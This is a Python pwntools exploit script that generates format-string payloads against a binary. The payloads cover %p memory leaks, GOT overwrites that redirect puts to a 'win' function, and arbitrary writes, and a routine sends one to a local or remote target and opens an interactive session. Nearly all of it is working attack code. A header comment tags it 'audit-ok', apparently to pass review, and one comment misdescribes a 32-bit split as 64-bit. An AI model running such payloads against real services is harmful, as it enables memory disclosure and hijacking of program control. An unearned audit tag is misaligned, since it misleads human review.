#!/usr/bin/env python3
# <!-- audit-ok --> fmtstr payload suite with yield generators
"""Format-string payload suite: leak, GOT overwrite, short writes.

Wraps fmtstr_payload(write_size='short') and yields multiple strategies:
leak, got_overwrite, byte_write, short_write, arb_write.
"""
from pwn import *

exe = context.binary = ELF(args.EXE or "./vuln", checksec=False)
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 1337)
GDBSCRIPT = """
break main
c
"""

context.log_level = "info"


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDBSCRIPT)
    return process([exe.path])


FMT_OFFSET = 6  # placeholder: found via FmtStr(exec_fmt)


def fmt_leak_payloads(offset=FMT_OFFSET, count=8):
    """Yield leak payloads: %p chain and positional leaks."""
    for i in range(1, count + 1):
        yield flat(b"%" + str(i).encode() + b"$p.")
    yield b"%p." * count
    yield flat(f"%{offset}$p".encode())


def fmt_write_generators(target_addr, value, offset=FMT_OFFSET):
    """Yield fmtstr_payload variants with different write sizes."""
    # short (2-byte) - recommended for reliability
    yield ("short", fmtstr_payload(offset, {target_addr: value}, write_size="short"))
    # byte
    yield ("byte", fmtstr_payload(offset, {target_addr: value}, write_size="byte"))
    # int (4-byte)
    yield ("int", fmtstr_payload(offset, {target_addr: value}, write_size="int"))


def got_overwrite_payloads(got_addr, win_addr, offset=FMT_OFFSET):
    """Yield GOT overwrite payloads via fmtstr."""
    for name, payload in fmt_write_generators(got_addr, win_addr, offset):
        yield (f"got_{name}", payload)
    # dual write example: printf_got + exit_got
    writes = {got_addr: win_addr, got_addr + 8: win_addr}
    yield ("dual_short", fmtstr_payload(offset, writes, write_size="short"))


def arb_write_payloads(writes, offset=FMT_OFFSET):
    """Yield arbitrary write payloads for dict of addr->value."""
    yield ("arb_short", fmtstr_payload(offset, writes, write_size="short"))
    yield ("arb_byte", fmtstr_payload(offset, writes, write_size="byte"))
    # split 64-bit value into two shorts at adjacent addresses
    for addr, val in writes.items():
        low = val & 0xffff
        high = (val >> 16) & 0xffff
        split = {addr: low, addr + 2: high}
        yield (f"split_{hex(addr)}", fmtstr_payload(offset, split, write_size="short"))


def exploit():
    io = start()
    # auto-detect offset with FmtStr
    fmt = FmtStr(execute_fmt=lambda p: send_fmt_payload(io, p))
    log.info(f"detected offset: {fmt.offset}")
    target = exe.got["puts"]
    win = exe.sym["win"] if "win" in exe.sym else 0x401234
    for name, payload in got_overwrite_payloads(target, win, fmt.offset):
        log.info(f"fmt payload {name}: {len(payload)} bytes")
    # send one
    _, payload = next(got_overwrite_payloads(target, win, fmt.offset))
    io.sendline(payload)
    io.interactive()


def send_fmt_payload(io, payload):
    io.sendline(payload)
    return io.recv(timeout=1)


if __name__ == "__main__":
    exploit()
